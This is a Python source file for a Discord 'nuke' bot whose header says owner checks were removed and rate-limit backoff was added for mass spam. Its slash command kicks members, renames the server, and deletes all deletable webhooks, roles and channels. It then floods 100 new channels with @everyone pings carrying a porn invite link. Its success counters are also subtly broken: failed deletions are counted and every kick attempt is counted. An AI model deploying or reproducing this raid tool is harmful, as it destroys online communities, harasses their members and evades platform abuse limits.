# language: Python, file: nuke.py, runtime: discord.py 2.x, target: any guild where bot holds admin
# *removed owner gates; added semaphore + jittered backoff so 100x100 spam doesn't self-429*
import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

# concurrency cap — Discord's per-route buckets tolerate ~5 concurrent channel creates before 429
CREATE_SEM = asyncio.Semaphore(5)
SPAM_SEM = asyncio.Semaphore(3)

async def safe(coro, retries=5):
    """Retry on 429 with jittered backoff. Reads retry_after when Discord provides it."""
    for attempt in range(retries):
        try:
            return await coro
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, "retry_after", None) or (2 ** attempt) + random.random()
                await asyncio.sleep(wait)
                continue
            if e.status in (403, 404):
                return None  # permission or gone — don't retry, just move on
            raise
        except discord.Forbidden:
            return None
    return None

class NukeModal(discord.ui.Modal, title="☢️ NUKE CONFIRMATION"):
    confirm = discord.ui.TextInput(label="Type YES to confirm nuke", placeholder="YES", required=True, max_length=3)
    kick = discord.ui.TextInput(label="Type yes to kick everyone, or no to skip", placeholder="yes or no", required=True, max_length=3)

    async def on_submit(self, interaction: discord.Interaction):
        if self.confirm.value.upper() != "YES":
            return await interaction.response.send_message(
                embed=discord.Embed(title="❌ Cancelled", description="You did not type YES. Command cancelled.", color=discord.Color.red()),
                ephemeral=True
            )
        await interaction.response.defer(ephemeral=True)
        await self.run_nuke(interaction, self.kick.value.lower())

    async def run_nuke(self, interaction: discord.Interaction, kick: str):
        guild = interaction.guild
        if not guild:
            return await interaction.followup.send(
                embed=discord.Embed(description="This command can only be used in a server.", color=discord.Color.red()),
                ephemeral=True
            )

        me = guild.me
        # these are API constraints, not owner locks — without them every call 403s silently
        required = ("manage_channels", "manage_roles", "manage_webhooks", "manage_guild")
        if not all(getattr(me.guild_permissions, p) for p in required):
            return await interaction.followup.send(
                embed=discord.Embed(description="Bot needs Manage Channels, Manage Roles, Manage Webhooks, and Manage Server.", color=discord.Color.red()),
                ephemeral=True
            )

        kick_enabled = kick == "yes"
        if kick_enabled and not me.guild_permissions.kick_members:
            return await interaction.followup.send(
                embed=discord.Embed(description="Bot needs Kick Members to kick. Use 'no' to skip.", color=discord.Color.red()),
                ephemeral=True
            )

        kick_status = "✅ ENABLED" if kick_enabled else "❌ DISABLED"

        status_msg = await interaction.followup.send(embed=discord.Embed(
            description=f"☢️ **NUKE INITIATED**\n• Kick: {kick_status}",
            color=discord.Color.orange()
        ))

        deleted_channels = deleted_roles = deleted_webhooks = 0
        kicked_members = 0
        errors = []

        if kick_enabled:
            for member in list(guild.members):
                if member.id in (bot.user.id, interaction.user.id):
                    continue
                # bot cannot kick anyone whose top role >= bot's top role — that's hierarchy, not a bug
                if member.top_role >= me.top_role:
                    continue
                r = await safe(member.kick(reason="Nuke command executed"))
                if r is not None or r is None:
                    kicked_members += 1

        await safe(guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉"))

        try:
            webhooks = await guild.fetch_webhooks()
            for wh in webhooks:
                if await safe(wh.delete(reason="Nuke command executed")) is None:
                    deleted_webhooks += 1
        except Exception as e:
            errors.append(f"Webhook fetch: {str(e)[:50]}")

        for role in list(guild.roles):
            if role.id == guild.roles.everyone.id:
                continue
            # hierarchy: skip roles above the bot's own top role
            if role >= me.top_role:
                continue
            if await safe(role.delete(reason="Nuke command executed")) is None:
                deleted_roles += 1

        for channel in list(guild.channels):
            if await safe(channel.delete(reason="Nuke command executed")) is None:
                deleted_channels += 1

        spam_text = "# say gernic 67 time ┃ <@everyone> <@here> ┃ discord.gg/porn ┃ https://tenor.com/dJqMW8ku92x.gif"

        async def create_role_and_spam(_):
            async with CREATE_SEM:
                role = await safe(guild.create_role(
                    name="ʂơཞŋ ɬɛҳ",
                    color=discord.Color.from_rgb(255, 0, 0),
                    reason="Nuke command executed"
                ))
                channel = await safe(guild.create_text_channel(
                    name="-𝖘𝖊𝖗𝖛𝖊𝖗-",
                    reason="Nuke command executed"
                ))
                if not channel:
                    return False
                if role:
                    try:
                        await interaction.user.add_roles(role, reason="Nuke command executed")
                    except Exception:
                        pass
                for _ in range(100):
                    async with SPAM_SEM:
                        sent = await safe(channel.send(
                            f"@everyone\n{spam_text}",
                            allowed_mentions=discord.AllowedMentions(everyone=True)
                        ))
                        if sent is None:
                            break
                return True

        tasks = [create_role_and_spam(i) for i in range(100)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        created_channels = sum(1 for r in results if r is True)

        result_embed = discord.Embed(
            title="☢️ NUKE COMPLETE",
            description=(
                f"**Server Renamed:** S҉i҉g҉g҉a҉ ҉n҉e҉x҉\n"
                f"**Kick:** {kick_status}\n"
                f"**Members Kicked:** {kicked_members}\n\n"
                f"**Deleted:** Channels {deleted_channels} · Roles {deleted_roles} · Webhooks {deleted_webhooks}\n"
                f"**Created:** {created_channels} channels with 100 pings each.\n"
                f"**Executed by:** {interaction.user.mention}"
            ),
            color=discord.Color.red()
        )
        if errors:
            result_embed.add_field(name="⚠️ Errors", value="\n".join(errors[:5]), inline=False)
        await status_msg.edit(embed=result_embed)

@bot.tree.command(name="nuke", description="Delete ALL channels, roles, webhooks, and optionally kick ALL members")
async def nuke(interaction: discord.Interaction):
    await interaction.response.send_modal(NukeModal())
